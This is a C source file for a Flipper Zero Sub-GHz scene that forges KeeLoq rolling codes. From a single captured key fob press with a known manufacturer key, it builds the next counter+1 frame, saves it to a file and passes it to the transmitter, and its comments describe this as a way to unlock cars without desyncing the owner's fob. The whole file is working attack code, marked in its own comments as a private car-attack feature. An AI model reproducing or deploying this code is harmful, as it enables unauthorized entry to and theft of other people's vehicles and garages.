#include "../subghz_i.h"

#include "applications/main/subghz/helpers/subghz_txrx_i.h" // txrx->environment, decoder accessors
#include "../helpers/subghz_txrx_create_protocol_key.h" // subghz_txrx_gen_keeloq_clone
#include "../helpers/subghz_rollback.h" // subghz_rollback_hex_after / _manufacturer
#include "../helpers/keeloq_instant.h" // keeloq_instant_synthesize (next-code preview)
#include <lib/subghz/blocks/generic.h>
#include <lib/subghz/blocks/math.h> // subghz_protocol_blocks_reverse_key
#include <lib/subghz/protocols/keeloq.h> // NAME + lookup_key + create_data (public_api.h)
#include <lib/flipper_format/flipper_format.h>
#include <string.h>

// KeeLoq "Instant Unlock" — one-tap next-code synthesis + TX. PRIVATE only.
//
// Reached from the Rolling-Code Analyzer's Left "Unlock" spoke for a decoded
// KeeLoq (NXP rolling-code) capture whose manufacturer key matched the keystore.
// A car's receiver accepts a code slightly AHEAD of the last one it saw without
// desyncing the real fob, so from a single captured press (serial/btn/counter +
// keystore key) we synthesize counter+1 and transmit it.
//
// Two roles, deliberately split (see the SDD ruling for this feature):
//   - PREVIEW: keeloq_instant_synthesize() (host-validated, SIMPLE/NORMAL) shows
//     the fix/hop the next frame will carry. It uses the GENERIC 10-bit
//     discriminator layout, which is WRONG for the ~28 manufacturers that reshape
//     the hop plaintext (keeloq.c:365-436). So the preview is cross-checked
//     byte-exact against the real encoder below and only shown as "synth" when it
//     agrees; otherwise the authoritative encoder value is shown.
//   - TX: subghz_txrx_gen_keeloq_clone() — the REAL KeeLoq encoder path. It
//     re-encrypts with the recovered key, increments the counter and handles ALL
//     per-manufacturer reshaping correctly, so the transmitted frame is always
//     valid regardless of the preview's generic-layout limitation.
//
// Read-only w.r.t. the original capture; the forged frame is written to a new
// /garage/.sub and handed to the Transmitter (explicit user send).

#ifndef PUBLIC_BUILD

#define TAG "SubGhzSceneKeeloqInstant"

void subghz_scene_keeloq_instant_send_callback(
    GuiButtonType result,
    InputType type,
    void* context) {
    furi_assert(context);
    SubGhz* subghz = context;
    if((result == GuiButtonTypeCenter) && (type == InputTypeShort)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneKeeloqInstantSend);
    }
}

// Reload the selected capture and pull the KeeLoq identity off the decoder's
// authoritative get_string ("Fix:.. Cnt:.. MF:.."), exactly like the Rolling-Code
// Analyzer. Returns true only for a decoded KeeLoq frame with a matched key
// (serial/btn/cnt/manuf written out); false otherwise (outputs untouched).
static bool subghz_scene_keeloq_instant_parse(
    SubGhz* subghz,
    uint32_t* serial,
    uint8_t* btn,
    uint16_t* cnt,
    uint32_t* seed,
    char* mf,
    size_t mf_sz) {
    bool loaded = subghz_txrx_load_decoder_by_name_protocol(
        subghz->txrx,
        subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
    FlipperFormat* fff = subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
    SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
    if(loaded && fff && decoder) {
        subghz_protocol_decoder_base_deserialize(decoder, fff);
    }
    if(!loaded || !fff || !decoder || !decoder->protocol || !decoder->protocol->name) return false;
    if(strcmp(decoder->protocol->name, SUBGHZ_PROTOCOL_KEELOQ_NAME) != 0) return false;

    FuriString* text = furi_string_alloc();
    subghz_protocol_decoder_base_get_string(decoder, text);
    const char* t = furi_string_get_cstr(text);
    // Same set as the analyzer's can_clone: key matched (MF known), AND either a
    // recovered seed (secure BFT/Erreka — the counter alone is not enough) or a
    // recovered counter (every other make). Covers all keystore manufacturers.
    bool decoded = false;
    if(strstr(t, "MF:Unknown") == NULL) {
        if(strstr(t, "MF:BFT") != NULL || strstr(t, "MF:Erreka") != NULL) {
            decoded = subghz_rollback_hex_after(t, "Sd:") != 0;
        } else {
            decoded = strstr(t, "Cnt:") != NULL && strstr(t, "Cnt:????") == NULL;
        }
    }
    if(decoded) {
        uint32_t fix = subghz_rollback_hex_after(t, "Fix:");
        *serial = fix & 0x0FFFFFFFu;
        *btn = (uint8_t)((fix >> 28) & 0x0F);
        *cnt = (uint16_t)subghz_rollback_hex_after(t, "Cnt:");
        *seed = subghz_rollback_hex_after(t, "Sd:"); // 0 for non-secure makes
        subghz_rollback_manufacturer(t, mf, mf_sz);
        // BFT/Erreka get_string is "MF:BFT Sd:XXXX" (space, no separator) — trim at the
        // first space to the bare keystore name (harmless for space-free names).
        char* sp = strchr(mf, ' ');
        if(sp) *sp = '\0';
    }
    furi_string_free(text);
    return decoded;
}

void subghz_scene_keeloq_instant_on_enter(void* context) {
    SubGhz* subghz = context;

    widget_reset(subghz->widget);
    widget_add_string_element(
        subghz->widget, 64, 0, AlignCenter, AlignTop, FontPrimary, "KeeLoq Unlock");

    uint32_t serial = 0;
    uint8_t btn = 0;
    uint16_t cnt = 0;
    uint32_t seed = 0;
    char mf[24] = {0};
    if(!subghz_scene_keeloq_instant_parse(subghz, &serial, &btn, &cnt, &seed, mf, sizeof(mf))) {
        widget_add_string_element(
            subghz->widget,
            0,
            16,
            AlignLeft,
            AlignTop,
            FontSecondary,
            "No decoded KeeLoq\ncapture (key unknown).");
        view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
        return;
    }

    uint16_t next_cnt = (uint16_t)(cnt + 1u);

    // Preview via the host-validated synthesizer (SIMPLE/NORMAL), then cross-check
    // byte-exact against the REAL encoder so a manufacturer-reshaped hop never gets
    // shown as if it were the generic-layout one.
    uint64_t mf_key = 0;
    uint8_t learn_type = 0;
    uint32_t hfix = 0, hhop = 0;
    bool synth = false;
    uint32_t afix = 0, ahop = 0;
    bool authoritative = false;

    SubGhzTransmitter* tx =
        subghz_transmitter_alloc_init(subghz->txrx->environment, SUBGHZ_PROTOCOL_KEELOQ_NAME);
    if(tx) {
        void* proto = subghz_transmitter_get_protocol_instance(tx);
        if(subghz_protocol_keeloq_encoder_lookup_key(proto, mf, &mf_key, &learn_type)) {
            synth = keeloq_instant_synthesize(mf_key, learn_type, serial, btn, next_cnt, &hfix, &hhop);
        }
        // Authoritative fix/hop: build the real next frame and read its 64-bit "Key"
        // back out (Key = reverse_key((fix<<32)|hop, 64) — keeloq.c:555-557).
        SubGhzRadioPreset* hp =
            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
        SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);
        FlipperFormat* tf = flipper_format_string_alloc();
        // Secure makes (seed present) derive the device key from the seed, so build
        // their authoritative frame via the seed-aware encoder; everyone else uses the
        // plain create_data. Both write the 64-bit "Key" the same way.
        bool built = seed ? subghz_protocol_keeloq_bft_create_data(
                                proto, tf, serial, btn, next_cnt, seed, mf, &preset) :
                            subghz_protocol_keeloq_create_data(
                                proto, tf, serial, btn, next_cnt, mf, &preset);
        if(built) {
            uint8_t key_data[8] = {0};
            flipper_format_rewind(tf);
            if(flipper_format_read_hex(tf, "Key", key_data, sizeof(key_data))) {
                uint64_t key64 = 0;
                for(size_t i = 0; i < sizeof(key_data); i++) key64 = (key64 << 8) | key_data[i];
                uint64_t yek = subghz_protocol_blocks_reverse_key(key64, 64);
                afix = (uint32_t)(yek >> 32);
                ahop = (uint32_t)(yek & 0xFFFFFFFFu);
                authoritative = true;
            }
        }
        flipper_format_free(tf);
        subghz_transmitter_free(tx);
    }

    bool verified = synth && authoritative && (hfix == afix) && (hhop == ahop);

    FuriString* body = furi_string_alloc();
    furi_string_cat_printf(body, "MF: %s\n", mf[0] ? mf : "?");
    furi_string_cat_printf(body, "SN:0x%08lX Btn:%d\n", (unsigned long)serial, (int)btn);
    furi_string_cat_printf(
        body, "Cnt:0x%04lX -> 0x%04lX\n", (unsigned long)cnt, (unsigned long)next_cnt);
    if(verified) {
        furi_string_cat_printf(body, "Fix:%08lX Hop:%08lX", (unsigned long)hfix, (unsigned long)hhop);
    } else if(authoritative) {
        // Manufacturer-reshaped layout (or non-SIMPLE/NORMAL): show the real encoder
        // value, not the generic-layout synth. Trailing '*' flags the mfr-specific hop.
        furi_string_cat_printf(
            body, "Fix:%08lX Hop:%08lX*", (unsigned long)afix, (unsigned long)ahop);
    } else {
        furi_string_cat_printf(body, "Next code ready (cnt+1)");
    }
    widget_add_string_multiline_element(
        subghz->widget, 0, 14, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(body));
    furi_string_free(body);

    widget_add_button_element(
        subghz->widget,
        GuiButtonTypeCenter,
        "Send",
        subghz_scene_keeloq_instant_send_callback,
        subghz);

    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
}

bool subghz_scene_keeloq_instant_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;

    if(event.type == SceneManagerEventTypeCustom &&
       event.event == SubGhzCustomEventSceneKeeloqInstantSend) {
        // Stop RX/hopper before building + handing off (mirrors the analyzer's Save/
        // predict handlers — the radio must be idle for the clone build + TX).
        subghz->state_notifications = SubGhzNotificationStateIDLE;
        subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
        subghz_txrx_stop(subghz->txrx);

        uint32_t serial = 0;
        uint8_t btn = 0;
        uint16_t cnt = 0;
        uint32_t seed = 0;
        char mf[24] = {0};
        if(!subghz_scene_keeloq_instant_parse(subghz, &serial, &btn, &cnt, &seed, mf, sizeof(mf))) {
            furi_string_set(subghz->error_str, "KeeLoq reload\nfailed.");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
            return true;
        }

        SubGhzRadioPreset* hp =
            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
        uint32_t freq = hp ? hp->frequency : 433920000;

        // Build the next frame (counter+1) with the REAL encoder — re-encrypts with the
        // recovered key + applies any per-manufacturer reshaping. Secure BFT/Erreka
        // (seed present) derive the device key from the seed, so use the seed-aware
        // builder; every other make uses the no-desync clone (jump=0 = no lead).
        bool ok = seed ? subghz_txrx_gen_keeloq_bft_protocol(
                             subghz->txrx, "AM650", freq, serial, btn, (uint16_t)(cnt + 1u), seed, mf) :
                         subghz_txrx_gen_keeloq_clone(
                             subghz->txrx, "AM650", freq, serial, btn, (uint16_t)(cnt + 1u), 0, mf);
        if(ok) {
            FuriString* path = furi_string_alloc();
            furi_string_printf(
                path,
                "%s/garage/keeloq_unlock_%08lX.sub",
                SUBGHZ_APP_FOLDER,
                (unsigned long)serial);
            ok = subghz_save_protocol_to_file(
                     subghz, subghz_txrx_get_fff_data(subghz->txrx), furi_string_get_cstr(path)) &&
                 subghz_key_load(subghz, furi_string_get_cstr(path), false);
            furi_string_free(path);
        }

        if(ok) {
            FURI_LOG_I(
                TAG,
                "KeeLoq instant: MF=%s SN=%08lX cnt=%04lX->%04lX TX",
                mf,
                (unsigned long)serial,
                (unsigned long)cnt,
                (unsigned long)(uint16_t)(cnt + 1u));
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
        } else {
            furi_string_set(subghz->error_str, "Unlock build\nfailed (key/SD?).");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
        }
        return true;
    }
    return false;
}

void subghz_scene_keeloq_instant_on_exit(void* context) {
    SubGhz* subghz = context;
    widget_reset(subghz->widget);
}

#endif /* !PUBLIC_BUILD — KeeLoq known-key instant unlock, private car-attack surface only */
